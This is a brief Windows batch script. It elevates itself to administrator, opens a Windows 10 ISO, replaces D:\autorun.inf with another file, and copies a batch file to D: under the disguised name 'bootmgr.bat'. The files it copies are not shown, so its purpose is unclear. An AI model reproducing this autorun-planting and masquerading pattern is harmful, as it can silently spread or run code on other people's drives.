@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
cd F:
start F:\Win10_22H2_Turkish_x64.iso
pause
del D:\autorun.inf
copy system.inf "D:\autorun.inf"
copy mapoto.bat "D:\bootmgr.bat"